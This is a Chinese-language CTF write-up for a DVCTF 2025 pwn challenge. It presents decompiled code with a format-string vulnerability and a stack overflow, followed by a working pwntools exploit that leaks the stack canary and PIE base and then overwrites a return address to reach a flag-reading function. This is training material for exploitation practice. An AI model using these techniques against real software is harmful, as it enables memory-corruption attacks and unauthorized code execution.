# DVCTF2025


格式化字符串漏洞+栈溢出

<!--more-->

# DVCTF

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## 逆向分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-44h] BYREF
  char v5[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  puts(asc_2190);
  puts(&byte_2228);
  puts(&byte_22C0);
  puts(&byte_2358);
  puts(&byte_23F0);
  puts(&byte_2488);
  puts(&byte_2520);
  puts(&byte_25B8);
  puts(&byte_2650);
  puts(&byte_26E8);
  puts(&byte_2780);
  puts(&byte_2818);
  puts(&byte_28B0);
  puts(&byte_2948);
  puts(&byte_29E0);
  puts(&byte_2A78);
  puts(&byte_2B10);
  puts(&byte_2BA8);
  puts(&byte_2C40);
  puts(&byte_2CD8);
  puts(&byte_2D70);
  puts(&byte_2E08);
  puts(&byte_2EA0);
  puts(&byte_2F38);
  puts(&byte_2FD0);
  puts(&byte_3068);
  puts(&byte_3100);
  puts(&byte_3198);
  puts(&byte_3230);
  puts(&byte_32C8);
  puts("Enter your name : ");
  __isoc99_scanf(" %[^\n]", v5);
  printf("\n Hey %s ", v5);
  puts(" ! Welcome to the Louvre software !");
  do
  {
    displayMenu();
    __isoc99_scanf("%d", &v4);
    if ( v4 == 4 )
    {
      QuitProgram(v5);
    }
    else
    {
      if ( v4 <= 4 )
      {
        switch ( v4 )
        {
          case 3:
            VisitRoom();
            continue;
          case 1:
            CheckIdentity(v5);
            continue;
          case 2:
            CheckVersion();
            continue;
        }
      }
      puts("\n Invalid choice. ");
    }
  }
  while ( v4 != 4 );
  return 0;
}
```

CheckIdentity中存在格式化字符串漏洞

```c
int __fastcall CheckIdentity(const char *a1)
{
  puts("Your identity is : ");
  return printf(a1);
}
```

VisitRoom中存在栈溢出漏洞

```c
__int64 VisitRoom()
{
  unsigned int v1; // [rsp+8h] [rbp-18h] BYREF
  char v2[10]; // [rsp+Eh] [rbp-12h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("How many rooms do you want to visit? ( 0-99 )");
  __isoc99_scanf("%2d", &v1);
  if ( v1 <= 0x1388 )
  {
    printf("\nYou have chosen to request a visit %d rooms.\n", v1);
  }
  else
  {
    puts("That's a lot, isn't it?!");
    puts("Who are the tickets for?");
    __isoc99_scanf("%s", v2);
    printf("Tickets will be sent to: %s\n", v2);
  }
  return 0;
}
```

存在输出flag的函数

```c
void readflag()
{
  char v0; // [rsp+7h] [rbp-9h]
  FILE *stream; // [rsp+8h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    while ( 1 )
    {
      v0 = fgetc(stream);
      if ( v0 == -1 )
        break;
      putchar(v0);
    }
    fclose(stream);
  }
  else
  {
    perror("Failed to open file");
  }
}
```

## 思路

通过格式化字符串漏洞，泄露栈上的canary和程序基地址。通过栈溢出，修改返回地址

## exp

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    # pause()

address = './pwn'
p = process(address)

elf = ELF(address)
libc = elf.libc

# ip = ""
# port = 
#p = remote(ip,port)

backdoor = 0x1296

p.recvuntil(b'name : \n')
pl = b'%19$p|%9$p'
p.sendline(pl)
# dbg()
p.sendline(b'1')

p.recvuntil(b'identity is : \n')

canary = int(p.recv(18),16)
success("canary ---> 0x%x",canary)
p.recvuntil(b'|')
base_addr = int(p.recv(14),16)
base_addr = base_addr - 0x5619fcb116fb + 0x5619fcb10000
success("base_addr ---> 0x%x",base_addr)

p.sendline(b'3')
p.sendline(b'-1')
p.recvuntil(b'for?\n')
pl = b'a'*10 + p64(canary) 
pl+= p64(0) + p64(base_addr + backdoor)
p.sendline(pl)
p.interactive()
```

## 知识点

**`scanf("%s")` 的行为**：

- `%s` 会读取输入直到遇到 **空白字符**（空格、换行、制表符等），**不会因 `\x00` 终止**。
- 输入数据中的 `\x00` 会被视为普通字符，继续写入内存。

（。。。当时打的时候还以为canary的\x00会截断scanf的%s）


---

> Author: J4f  
> URL: https://shlomojune.github.io/posts/dvctf2025/  

